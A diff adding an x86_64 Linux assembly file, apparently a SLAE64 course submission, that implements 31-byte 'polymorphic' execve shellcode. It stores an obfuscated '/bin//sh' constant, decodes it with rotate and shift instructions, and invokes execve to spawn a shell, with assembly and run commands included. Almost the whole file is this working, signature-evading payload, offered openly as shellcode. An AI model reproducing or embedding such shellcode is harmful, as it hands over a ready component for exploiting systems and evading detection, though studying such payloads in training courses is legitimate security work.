@@ -1,0 +1,28 @@
+;Title: polymorphic execve shellcode
+;Author: d4sh&r
+;Contact: https://mx.linkedin.com/in/d4v1dvc
+;Category: Shellcode
+;Architecture:linux x86_64
+;SLAE64-1379
+;Description:
+;Polymorphic shellcode in 31 bytes to get a shell 
+;Tested on : Linux kali64 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 x86_64 GNU/Linux
+ 
+;Compilation and execution
+;nasm -felf64 shell.nasm -o shell.o
+;ld shell.o -o shell
+;./shell
+ 
+global _start
+  
+_start:
+    mul esi
+    push rdx
+    mov al,1                         
+    mov rbx, 0xd2c45ed0e65e5edc ;/bin//sh 
+    rol rbx,24
+    shr rbx,1
+    push rbx
+    lea rdi, [rsp] ;address of /bin//sh
+    add al,58
+    syscall
